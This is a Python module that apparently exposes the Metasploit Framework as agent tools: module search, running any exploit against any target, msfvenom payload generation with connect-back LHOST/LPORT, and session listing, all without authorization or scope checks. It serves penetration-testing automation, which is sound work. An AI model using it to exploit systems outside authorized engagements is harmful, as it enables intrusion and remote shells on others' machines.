"""
B13 Metasploit Tools - REAL Metasploit Framework integration

Drives the actual Metasploit Framework installed on this host:
- search_exploit        -> msfconsole: search <term>
- execute_exploit       -> msfconsole: use <mod>; set ...; run
- generate_payload      -> msfvenom (real payload generation)
- list_sessions         -> msfconsole: sessions -l

No simulated data. Every method invokes the real msfconsole/msfvenom binaries
and returns their actual output.
"""

import os
import re
import json
import shutil
import asyncio
import subprocess
import tempfile
from typing import Dict, Any, List


def _have(binary: str) -> bool:
    return shutil.which(binary) is not None


_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


def _strip_ansi(text: str) -> str:
    """Remove ANSI color codes from msfconsole output."""
    return _ANSI_RE.sub("", text)


def _run(cmd: List[str], timeout: int = 300, stdin_data: str = None,
        binary: bool = False) -> Dict[str, Any]:
    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=timeout,
            input=(stdin_data.encode() if stdin_data else None),
            text=(not binary),
        )
        return {
            "cmd": " ".join(cmd),
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except subprocess.TimeoutExpired as e:
        return {"cmd": " ".join(cmd), "returncode": -1,
                "stdout": e.stdout or "", "stderr": f"TIMEOUT after {timeout}s"}
    except FileNotFoundError as e:
        return {"cmd": " ".join(cmd), "returncode": 127,
                "stdout": "", "stderr": f"tool not found: {e}"}


class MetasploitTools:
    """Metasploit Framework integration - REAL msfconsole/msfvenom backed."""

    def __init__(self, mcp_server_url: str = None):
        # mcp_server_url is accepted for interface compatibility but this class
        # talks to the locally-installed Metasploit Framework directly.
        self.mcp_server_url = mcp_server_url
        self.session = None
        self.available = {
            "msfconsole": _have("msfconsole"),
            "msfvenom": _have("msfvenom"),
        }

    async def _msf(self, commands: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Run a batch of msfconsole commands via -x and return real output."""
        if not self.available["msfconsole"]:
            raise RuntimeError("msfconsole is not installed or not on PATH")
        # Always terminate the console
        cmds = list(commands) + ["exit"]
        # msfconsole -q -x 'cmd1' -x 'cmd2' ...
        cmd = ["msfconsole", "-q"]
        for c in cmds:
            cmd += ["-x", c]
        return await asyncio.to_thread(_run, cmd, timeout)

    # --------------------------------------------------------------- search
    async def search_exploit(self, search_term: str) -> dict:
        """REAL search of the Metasploit module database."""
        res = await self._msf([f"search {search_term}"], timeout=180)
        modules = self._parse_search(res["stdout"])
        return {
            "status": "completed" if res["returncode"] == 0 else "error",
            "term": search_term,
            "modules": modules,
            "count": len(modules),
            "returncode": res["returncode"],
            "raw": res["stdout"],
            "stderr": res["stderr"][:500],
        }

    @staticmethod
    def _parse_search(stdout: str) -> List[Dict[str, Any]]:
        """Parse msf 6.x 'search' table.
        Columns: #  Full Name  Disclosure Date  Rank  Check  Name
        e.g.  1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  Yes  VSFTPD 2.3.4 ...
        """
        modules = []
        clean = _strip_ansi(stdout)
        for line in clean.splitlines():
            m = re.match(
                r"^\s*(\d+)\s+(\S+)\s+(\d{4}-\d{2}-\d{2})\s+(\S+)\s+(Yes|No)\s+(.*)$",
                line.rstrip(),
            )
            if m:
                full_name = m.group(2)
                mod_type = full_name.split("/")[0] if "/" in full_name else ""
                modules.append({
                    "index": int(m.group(1)),
                    "full_name": full_name,
                    "type": mod_type,
                    "disclosure_date": m.group(3),
                    "rank": m.group(4),
                    "check": m.group(5),
                    "name": m.group(6).strip(),
                })
        return modules

    # ------------------------------------------------------------- execute
    async def execute_exploit(self, exploit_name: str, target: str,
                              options: dict = None) -> dict:
        """REAL exploit execution against a target via msfconsole."""
        options = options or {}
        commands = [
            f"use {exploit_name}",
            f"set RHOSTS {target}",
        ]
        for k, v in options.items():
            commands.append(f"set {k} {v}")
        commands += ["set ExitOnSession false", "exploit -z"]

        res = await self._msf(commands, timeout=600)
        session = self._parse_session(res["stdout"])
        return {
            "status": "completed" if res["returncode"] == 0 else "error",
            "exploit": exploit_name,
            "target": target,
            "options": options,
            "session": session,
            "returncode": res["returncode"],
            "raw": res["stdout"],
            "stderr": res["stderr"][:1000],
        }

    @staticmethod
    def _parse_session(stdout: str):
        m = re.search(r"(\d+) opened", stdout)
        if m:
            return {"opened": True, "session_id": int(m.group(1))}
        if "session" in stdout.lower() and "created" in stdout.lower():
            return {"opened": True, "session_id": None}
        return {"opened": False, "session_id": None}

    # ------------------------------------------------------- payload gen
    async def generate_payload(self, payload_type: str, lhost: str, lport: int,
                               fmt: str = "raw", output_file: str = None) -> dict:
        """REAL payload generation via msfvenom."""
        if not self.available["msfvenom"]:
            raise RuntimeError("msfvenom is not installed or not on PATH")

        # Always write to a real file so binary payloads are captured safely.
        if not output_file:
            fd, output_file = tempfile.mkstemp(prefix="b13_payload_", suffix=f".{fmt}")
            os.close(fd)

        cmd = [
            "msfvenom", "-p", payload_type,
            f"LHOST={lhost}", f"LPORT={lport}",
            "-f", fmt, "-o", output_file,
        ]
        res = await asyncio.to_thread(_run, cmd, timeout=180, binary=True)
        size = os.path.getsize(output_file) if os.path.exists(output_file) else 0
        # stderr is text here (binary=True still gives bytes for stderr; decode safely)
        err = res["stderr"]
        if isinstance(err, bytes):
            err = err.decode("utf-8", "replace")
        return {
            "status": "completed" if res["returncode"] == 0 and size > 0 else "error",
            "payload_type": payload_type,
            "lhost": lhost,
            "lport": lport,
            "format": fmt,
            "output_file": output_file,
            "size_bytes": size,
            "sha256": self._sha256(output_file) if size else None,
            "returncode": res["returncode"],
            "stderr": err[:500],
        }

    @staticmethod
    def _sha256(path: str) -> str:
        import hashlib
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()

    # ------------------------------------------------------------- sessions
    async def list_sessions(self) -> dict:
        """REAL list of active Metasploit sessions."""
        res = await self._msf(["sessions -l"], timeout=120)
        sessions = self._parse_sessions(res["stdout"])
        return {
            "status": "completed" if res["returncode"] == 0 else "error",
            "sessions": sessions,
            "count": len(sessions),
            "returncode": res["returncode"],
            "raw": res["stdout"],
            "stderr": res["stderr"][:500],
        }

    @staticmethod
    def _parse_sessions(stdout: str) -> List[Dict[str, Any]]:
        sessions = []
        for line in stdout.splitlines():
            m = re.match(r"^\s*(\d+)\s+(\S+)\s+(\S+)\s+(\S+.*?)\s{2,}(.*)$", line.rstrip())
            if m and m.group(1).isdigit():
                sessions.append({
                    "session_id": int(m.group(1)),
                    "type": m.group(2),
                    "info": m.group(3),
                    "connection": m.group(4).strip(),
                    "via": m.group(5).strip(),
                })
        return sessions
